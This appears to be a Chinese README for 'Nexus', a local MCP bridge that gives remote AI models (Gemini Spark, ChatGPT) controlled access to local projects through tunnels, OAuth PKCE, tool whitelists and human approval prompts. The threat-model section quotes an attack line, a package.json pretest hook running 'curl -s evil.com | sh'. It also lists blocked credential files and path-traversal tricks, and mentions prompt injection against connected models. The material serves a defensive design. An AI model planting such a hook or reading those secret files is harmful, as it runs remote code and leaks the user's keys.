# Nexus (LocalBridge) - 本地 AI 控制中枢与安全桥接系统

> **定位**：专为 **Google Gemini Spark** 与 **OpenAI ChatGPT** 打造的本地安全控制中枢（Local AI Control Plane）与生产级 MCP 桥接网关。

---

## 1. 项目诞生背景与设计哲学

随着大语言模型（LLM）从单纯的“自然语言对话”演进为能够调用工具、修改工程代码的“自主软件工程师”（如 Google Gemini Spark、OpenAI ChatGPT），开发者面临一个核心困境：

* **生产力爆发**：开发者希望将本地庞大的项目源码、配置文件、Git 仓库与开发工具链开放给顶尖模型，实现自动化跨文件重构、错误诊断与项目分析。
* **安全底线**：让远程 AI 直连本地存在巨大隐患。一旦外部模型遭遇**提示词注入（Prompt Injection）**或恶意代码投毒，未经受限的本地访问权限将导致敏感密钥泄露（如 `.env`、SSH 私钥）甚至远程代码执行（RCE）。

**Nexus** 旨在解决这一矛盾：
> **在保障本地计算机绝对安全、物理权限强可控的前提下，构建一条标准化、企业级、易穿透的双向控制桥梁，让 Gemini Spark 与 ChatGPT 能够安全、高效地感知并协作操作本地项目。**

---

## 2. 系统核心架构与拓扑设计

Nexus 采用了**客户端 - 边缘 - 桥接 - 核心**四层解耦的高内聚架构：

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        支持的双核心 AI 生态                            │
│           [Google Gemini Spark]         [OpenAI ChatGPT]               │
└──────────────────────┬──────────────────────────┬──────────────────────┘
                       │                          │
                       │ (Streamable HTTP / MCP)  │ (Dedicated AI Gateway)
                       ▼                          ▼
┌────────────────────────────────────────────────────────────────────────┐
│                    Cloudflare Zero Trust 穿透层                        │
│   • 自动化 Tunnel 守护进程 (cloudflared agent / Quick Tunnel)           │
│   • Edge Anycast 路由与 TLS 终结 (自定义域名 / trycloudflare)            │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │ HTTP 8787 (Bridge) / 18080 (Gateway)
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│                 Nexus MCP Bridge & OAuth 2.0 引擎                      │
│   • RFC 8414 Discovery / RFC 9728 Protected Resource                   │
│   • 动态客户端注册 (DCR) + PKCE (S256) 授权码流                        │
│   • 8 大高频受控核心工具白名单 (文件、目录、Git、环境状态)             │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │ IPC (management-token.key 保护)
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│                 Nexus Core (核心安全守护进程 :18080)                    │
│   • 细粒度策略引擎 (TrustPolicyEvaluator)                              │
│   • 破坏性操作人工审批闭环 (Human-in-the-Loop Approval Loop)           │
│   • 语言服务器协议 (LSP Code Intelligence)                             │
│   • 工作流与多会话运行时 (Persistent Workflow & Runtime Sessions)       │
│   • 技能体系引擎 (Nexus Skills Engine)                                 │
└───────────────────────────────────┬────────────────────────────────────┘
                                    ▼
                     [ 本地项目文件 / Git / 开发工具链 ]
```

### 核心四大组件

1. **Nexus Desktop (桌面主控台 - Tauri 2 + Rust + React 19)**：
   * 采用 Rust 构建原生主控进程，彻底禁用高危 Node.js/Shell 插件，实现内存安全的本地 UI。
   * 包含安静控制中心（Quiet Command Center）、AI 连接中心、原生审批弹窗中心、日志审计抽屉与技能管理面板。
2. **Nexus Core (核心安全守护进程 - Fastify + SQLite WAL :18080)**：
   * 系统的控制底座，管理所有受信任项目的生命周期与凭证。
   * 维护严格的 Token 域隔离（`lb_` 供 MCP 客户端、`lbr_` 供 Runner、`lm_` 供本机桌面管理）。
   * 挂载基于 WAL 模式的高性能 SQLite，具备数据库自动迁移与安全快照能力。
3. **Nexus MCP Bridge (远程 AI 桥接网关 :8787)**：
   * 专门针对 **Google Gemini Spark** 等前沿 MCP 规范构建的无状态/多会话 HTTP 桥接网关。
   * 原生支持 RFC 8414 发现、RFC 9728 保护资源元数据、RFC 7591 动态注册（DCR）与 RFC 7636 PKCE S256。
   * 物理裁剪高危指令，对外仅暴露受控的 8 大标准工具。
4. **Cloudflare Zero Trust 自动化穿透网关**：
   * 无需公网 IP、动态 DNS 或路由器端口映射。
   * 支持一键生成免配置开发隧道（Quick Tunnel `*.trycloudflare.com`），或通过 Cloudflare API 自动化绑定生产级自定义域名。

---

## 3. 工具清单与客户端路由全景矩阵

Nexus 遵循“按信任距离分配权限”的最小特权原则：

| 客户端类别 | 典型代表 | 接入物理路径 | 鉴权协议 | 开放工具清单 | 严格禁用的能力 |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **远程 MCP 客户端** | **Google Gemini Spark** | `云端 -> Cloudflare Tunnel (:443) -> Nexus MCP Bridge (:8787) -> Nexus Core (:18080)` | **OAuth 2.0 PKCE**（DCR 动态注册 + 授权码）或专用 Bearer Token | **受控 8 大高频核心工具**：<br>1. `nexus_project_list`<br>2. `nexus_project_info`<br>3. `nexus_directory_list`<br>4. `nexus_file_read`<br>5. `nexus_file_create`<br>6. `nexus_file_write`<br>7. `nexus_git_status`<br>8. `nexus_runtime_list` | ❌ **绝对禁止命令行/终端执行**（物理无 `command.execute`）<br>❌ 无法调用 LSP 代码分析<br>❌ 无法直接 commit/push Git<br>❌ 无法管理后台作业 |
| **专有云端大模型中枢** | **OpenAI ChatGPT** (Custom Action / Web) | `OpenAI 节点 -> Cloudflare / 反代隧道 -> Nexus AI Gateway (:18080)` | Dedicated Bearer Token + IP/Host 白名单校验 | **ChatGPT 专用控制工具集**：<br>• 项目与上下文感知<br>• 受控文件读写<br>• 声明式 Skills 编排与调用 | ❌ 物理裁剪任意终端命令执行能力，关键写操作需前置确认 |
| **本地桌面开发客户端** | **Claude Desktop**、**Cursor**、**IDE 插件** | `本地 Stdio 或 Localhost Loopback -> Nexus Core (:18080/mcp)` | 本地 Management Token (`management-token.key`) 或单工程 Token | **完整 62 个全功能 MCP 工具集**：<br>• 文件系统全集（读/写/建/删/状态）<br>• Git 控制（diff/stage/commit/branch/checkout）<br>• **终端命令**（`command.execute` 受审批流管控）<br>• 后台作业管理（`job.start`/`status`/`cancel`）<br>• LSP 代码智能（定义/引用/诊断/补全）<br>• 技能集与运行时（`skills.*`, `runtime.*`）<br>• 隔离工作树（`worktree.*`） | 受到本地策略模式（Strict/Supervised/Full Control）和人工审批弹窗约束 |
| **本机人类开发者** | **Nexus Desktop GUI** (Tauri + Rust) | `Tauri 原生 IPC (Rust Core) -> 本地 SQLite / Supervisor` | OS 本地进程提权与物理会话 | **物理最高控制权**：<br>• 启停全部子服务与端口监控<br>• **对命令/写操作弹出审批弹窗并点击确认/拒绝**<br>• 颁发/吊销任意客户端 Token<br>• 技能导入/删除与工作树物理清理 | 无限制（由真实人类通过物理鼠标键盘直接操控） |

---

## 4. 深度能力解析

### 4.1 Gemini Spark 生产级集成
针对 Gemini Spark 的连接规范，Nexus MCP Bridge 实现了严苛的标准对齐：
* **链路探测适配**：针对 Google 后端探针，支持 `HEAD /mcp` 返回 `Link: <.../.well-known/oauth-protected-resource>; rel="oauth-protected-resource"`，避免 405 Method Not Allowed 错误。
* **CORS 暴露标头**：显式暴露 `WWW-Authenticate, Link, Mcp-Session-Id, Mcp-Protocol-Version, Content-Type`，确保浏览器端与 Google 边缘代理平稳通信。
* **双模式握手**：
  * **DCR 动态客户端注册**：支持 Gemini 后端在无预置凭据的情况下自动交换 `client_id`。
  * **RFC 7636 PKCE S256**：防篡改授权校验，保障授权重定向安全。

### 4.2 ChatGPT 专有本地控制平面
Nexus 为 ChatGPT 提供了专属的本地集成能力：
* **专属 Gateway 转接**：通过专有 AI Gateway 路由，向 ChatGPT 提供结构化的 OpenAPI / MCP 端点。
* **Skills 技能感知与编排**：ChatGPT 可实时枚举并按需激活 Nexus 内挂载的自定义技能包，动态扩展垂直领域知识。

### 4.3 受控文件系统与路径安全
* **路径规范化防穿越（Anti-Path Traversal）**：系统底层通过 `fs.realpath` 彻底拦截 `../`、URL 编码越权、8.3 短文件名（`PROGRA~1`）、NTFS 交替数据流（`::$DATA`）与符号链接越界。
* **凭证黑名单硬隔离**：无论外部模型如何要求，核心引擎物理阻断对 `.env*`、`id_rsa`、`*.pem`、`*.key`、`credentials*`、`.git/config` 等文件的读取。

### 4.4 语言服务器（LSP）与托管工作树
* **内置 TypeScript Language Server**：为本地接入的模型提供 AST 级别的代码智能（跳转定义、引用分析、实时诊断、语法补全）。
* **托管工作树（Managed Worktree）**：支持为模型派生独立的 Git 隔离工作分支，大规模代码重构在隔离环境中运行，杜绝破坏当前工作区。

### 4.5 声明式 Skills 扩展生态
* **零 Manifest 智能兼容导入**：用户可直接将包含代码与 Markdown 的目录或 ZIP 压缩包拖入，Nexus 自动解析 Markdown 内的 YAML 元数据并生成合规的 `skill.yaml`。
* **集合管理**：支持将多个子技能按领域打包为集合（Collection），在抽屉式 UI 中统一启停或批量管理。

---

## 5. 核心安全哲学与威胁模型

### 5.1 关键洞察：写权限 + 命令执行 ≡ 任意代码执行，真正的防线在审批

在安全架构设计中，Nexus 确立了不可动摇的底线事实：
> **“一旦同时为 AI 开放了【写文件】与【命令执行】权限，任何提示词约束、参数过滤、正则黑名单在逻辑上都是失效的，其实质完全等同于任意代码执行（RCE）。”**

* **为什么黑名单无法抵御代码执行？**：拥有写权限的 AI 可以直接修改 `package.json` 中的构建脚本（如 `"pretest": "curl -s evil.com | sh"`），然后再请求运行合法的 `npm test`；或者向测试用例写入高危载荷并调用解释器执行。
* **Nexus 的确定性防线**：
  1. **物理拔除**：公网暴露的 MCP Bridge 物理移除所有终端执行工具，云端模型在协议层根本没有命令执行入口。
  2. **人工审批闭环（Human Approval Loop）**：对于本地拥有执行权限的场景，任何高危操作都会挂起请求，并在本地桌面端弹出 Native 审批弹窗。**必须且只能由本地人类通过鼠标物理点击确认**，模型自身无法调用审批接口，无法自发自批。

### 5.2 实测 DCR 授权安全闭环：模型绝不可能自己通过授权
* **界面与上下文物理隔离**：OAuth 授权过程中弹出的 HTML 授权确认页（Consent Screen）展示在用户本地浏览器窗口中。云端模型运行在服务商的远程集群中，既没有本地 DOM 树访问权，也无法模拟操作系统的物理鼠标动作。
* **拒绝无条件静默通过**：未经本地人类交互的请求不会被放行，唯有真实用户在授权页点击【Authorize / 允许授权】提交表单，系统才会下发一次性授权码。
* **PKCE 密文绑定**：即便网络流量被嗅探，缺乏本地客户端私有的 `code_verifier`，任何第三方都无法在 `/oauth/token` 端点兑换合法 Access Token。

---

## 6. 零依赖自包含便携交付（Self-Contained Runtime）

为了让用户告别繁琐的环境配置，Nexus 实现了完全的自包含交付：

1. **内置独立运行时**：安装包内直接打包经 SHA-256 校验的独立 `node.exe`（v24+），用户无需在宿主机安装 Node.js。
2. **预编译原生模块**：高性能 SQLite 引擎（`better-sqlite3`）与底层启动器在构建阶段直接编译打包入资源目录。
3. **独立二进制启动器**：通过 Rust 编译独立的可执行文件（`nexus-mcp-bridge.exe`），实现跨进程生命周期协同管理。
4. **标准化 Windows 安装包**：提供经过严苛签发验证的独立安装程序（`Nexus_1.2.0_x64-setup.exe`）与 MSI 包，双击即用。

---

## 7. 结语

**Nexus** 不仅是一座协议桥梁，更是 AI 时代开发者本地数字资产的“装甲安全门”。它让开发者能够放心地把最顶尖的 **Google Gemini Spark** 与 **OpenAI ChatGPT** 接入本地项目，在确保机器绝对安全的前提下，释放极致的工程生产力。
